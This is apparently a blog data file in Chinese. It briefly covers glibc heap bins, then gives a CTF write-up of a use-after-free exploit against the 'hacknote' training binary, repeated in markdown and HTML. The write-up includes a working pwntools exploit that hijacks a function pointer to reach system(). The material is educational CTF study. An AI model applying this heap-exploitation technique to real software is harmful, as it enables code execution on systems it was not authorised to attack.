vqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n<h4 id=\"fast-bin\"><a href=\"#fast-bin\" class=\"headerlink\" title=\"fast bin\"></a>fast bin</h4><p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p>\n<p>大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p>\n<p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p>\n<h4 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p>\n<h4 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p>\n<h3 id=\"内存分配流程\"><a href=\"#内存分配流程\" class=\"headerlink\" title=\"内存分配流程\"></a>内存分配流程</h3><p> <img src=\"/img/heapexploitation/1.jpg\"></p>\n<h3 id=\"内存释放流程\"><a href=\"#内存释放流程\" class=\"headerlink\" title=\"内存释放流程\"></a>内存释放流程</h3><p> <img src=\"/img/heapexploitation/2.jpg\"></p>\n<p><a href=\"https://heap-exploitation.dhavalkapil.com/\">Heap Exploitation</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">Understanding glibc malloc</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\">Syscalls used by malloc</a></p>\n<p><a href=\"https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf\">glibc 内存管理 ptmalloc 源代码分析</a></p>\n<p><a href=\"https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/\">Painless intro to the Linux userland heap</a></p>\n"},{"title":"UAF","date":"2022-11-22T12:37:00.000Z","excerpt":"User After Free in Heap Exploitation","_content":"\n#### 参考ctf-wiki\n\n<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote>\n\n以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）\n\n#### 漏洞的发现\n\n在`del_note()`函数中free掉指针之后没有清零：\n\n```C\nvoid del_note() {\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note\n```\n\n程序中给了system：\n\n````C\nint magic()\n{\n  return system(\"cat flag\");\n}\n````\n\n#### 漏洞利用方法\n\nexp如下\n\n```python\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndelete(0)\ndelete(1)\nadd(0x8, p32(magic))\nshow(0)\n```\n\n下面介绍这个exp的原理\n\n在delete 0和1之后fastbin结构如下图\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\nchunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间\n\nchunk C、D是`note[1]`的空间\n\n由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。\n\n当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。\n\n因此`add(0x8,p32(magic))`会把magic地址写入content，调用show的时候，会直接执行这个函数。\n\n理论是如此，下面用gdb验证一下\n\n#### 调试\n\n完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist\n\n```python\nfrom pwn import *\nr = process(file_name)\nelf = ELF('./hacknote')\nmenu = 'Your choice :'\n\ndef add(size, content):\n    r.sendlineafter(menu, '1')\n    r.sendlineafter('Note size :', str(size))\n    r.sendafter('Content :', content)\n\ndef delete(index):\n    r.sendlineafter(menu, '2')\n    r.sendlineafter('Index :', str(index))\n\ndef show(index):\n    r.sendlineafter(menu, '3')\n    r.sendlineafter('Index :', str(index))\n\ndef dbg():\n    gdb.attach(r)\n\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndbg()\ndelete(0)\ndelete(1)\ndbg()\nmagic = 0x08048986\nadd(0x8, p32(magic))\ndbg()\nshow(0)\nr.interactive()\n```\n\n在ida中可以看到notelist的地址\n\n```assembly\n.bss:0804A070 ; void *notelist\n.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r\n.bss:0804A070                                         ; add_note+61↑w ...\n.bss:0804A074                 db    ? ;\n```\n\n查看三次notelist的内容，\n\n![](/img/UAF/1.jpg)\n\n![](/img/UAF/2.jpg)\n\n![](/img/UAF/3.jpg)\n\n可以看到，`0x92f31a0`上的地址为print_note函数的地址，在free之前，`0x92f31a4`上的内容指向下一行开头，即`aaaa`字符串，所以这里就是note[0]。\n\n在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic\n\n","source":"_posts/堆利用 UAF.md","raw":"---\ntitle: UAF\ntags: [ctf-pwn,exp]\ndate: 2022-11-22 20:37:00\nexcerpt: User After Free in Heap Exploitation\n---\n\n#### 参考ctf-wiki\n\n<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote>\n\n以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）\n\n#### 漏洞的发现\n\n在`del_note()`函数中free掉指针之后没有清零：\n\n```C\nvoid del_note() {\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note\n```\n\n程序中给了system：\n\n````C\nint magic()\n{\n  return system(\"cat flag\");\n}\n````\n\n#### 漏洞利用方法\n\nexp如下\n\n```python\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndelete(0)\ndelete(1)\nadd(0x8, p32(magic))\nshow(0)\n```\n\n下面介绍这个exp的原理\n\n在delete 0和1之后fastbin结构如下图\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\nchunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间\n\nchunk C、D是`note[1]`的空间\n\n由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。\n\n当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。\n\n因此`add(0x8,p32(magic))`会把magic地址写入content，调用show的时候，会直接执行这个函数。\n\n理论是如此，下面用gdb验证一下\n\n#### 调试\n\n完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist\n\n```python\nfrom pwn import *\nr = process(file_name)\nelf = ELF('./hacknote')\nmenu = 'Your choice :'\n\ndef add(size, content):\n    r.sendlineafter(menu, '1')\n    r.sendlineafter('Note size :', str(size))\n    r.sendafter('Content :', content)\n\ndef delete(index):\n    r.sendlineafter(menu, '2')\n    r.sendlineafter('Index :', str(index))\n\ndef show(index):\n    r.sendlineafter(menu, '3')\n    r.sendlineafter('Index :', str(index))\n\ndef dbg():\n    gdb.attach(r)\n\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndbg()\ndelete(0)\ndelete(1)\ndbg()\nmagic = 0x08048986\nadd(0x8, p32(magic))\ndbg()\nshow(0)\nr.interactive()\n```\n\n在ida中可以看到notelist的地址\n\n```assembly\n.bss:0804A070 ; void *notelist\n.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r\n.bss:0804A070                                         ; add_note+61↑w ...\n.bss:0804A074                 db    ? ;\n```\n\n查看三次notelist的内容，\n\n![](/img/UAF/1.jpg)\n\n![](/img/UAF/2.jpg)\n\n![](/img/UAF/3.jpg)\n\n可以看到，`0x92f31a0`上的地址为print_note函数的地址，在free之前，`0x92f31a4`上的内容指向下一行开头，即`aaaa`字符串，所以这里就是note[0]。\n\n在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic\n\n","slug":"堆利用 UAF","published":1,"updated":"2022-11-22T16:48:15.865Z","_id":"clasg59en0000dguffskz39dl","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"参考ctf-wiki\"><a href=\"#参考ctf-wiki\" class=\"headerlink\" title=\"参考ctf-wiki\"></a>参考ctf-wiki</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote\">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>\n<p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p>\n<h4 id=\"漏洞的发现\"><a href=\"#漏洞的发现\" class=\"headerlink\" title=\"漏洞的发现\"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">del_note</span><span class=\"hljs-params\">()</span> &#123;<br>  <span class=\"hljs-type\">char</span> buf[<span class=\"hljs-number\">4</span>];<br>  <span class=\"hljs-type\">int</span> idx;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Index :&quot;</span>);<br>  read(<span class=\"hljs-number\">0</span>, buf, <span class=\"hljs-number\">4</span>);<br>  idx = atoi(buf);<br>  <span class=\"hljs-keyword\">if</span> (idx &lt; <span class=\"hljs-number\">0</span> || idx &gt;= count) &#123;<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class=\"hljs-number\">0</span>);<br>  &#125;<br>  <span class=\"hljs-keyword\">if</span> (notelist[idx]) &#123;<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]-&gt;content);<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class=\"hljs-comment\">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure>\n\n<p>程序中给了system：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">magic</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h4><p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>show(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p>下面介绍这个exp的原理</p>\n<p>在delete 0和1之后fastbin结构如下图</p>\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\n<p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p>\n<p>chunk C、D是<code>note[1]</code>的空间</p>\n<p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p>\n<p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p>\n<p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p>\n<p>理论是如此，下面用gdb验证一下</p>\n<h4 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class=\"hljs-string\">&#x27;./hacknote&#x27;</span>)<br>menu = <span class=\"hljs-string\">&#x27;Your choice :&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size, content</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Note size :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(size))<br>    r.sendafter(<span class=\"hljs-string\">&#x27;Content :&#x27;</span>, content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>dbg()<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>dbg()<br>magic = <span class=\"hljs-number\">0x08048986</span><br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>dbg()<br>show(<span class=\"hljs-number\">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>在ida中可以看到notelist的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure>\n\n<p>查看三次notelist的内容，</p>\n<p><img src=\"/img/UAF/1.jpg\"></p>\n<p><img src=\"/img/UAF/2.jpg\"></p>\n<p><img src=\"/img/UAF/3.jpg\"></p>\n<p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p>\n<p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>\n","site":{"data":{}},"more":"<h4 id=\"参考ctf-wiki\"><a href=\"#参考ctf-wiki\" class=\"headerlink\" title=\"参考ctf-wiki\"></a>参考ctf-wiki</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote\">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>\n<p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p>\n<h4 id=\"漏洞的发现\"><a href=\"#漏洞的发现\" class=\"headerlink\" title=\"漏洞的发现\"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">del_note</span><span class=\"hljs-params\">()</span> &#123;<br>  <span 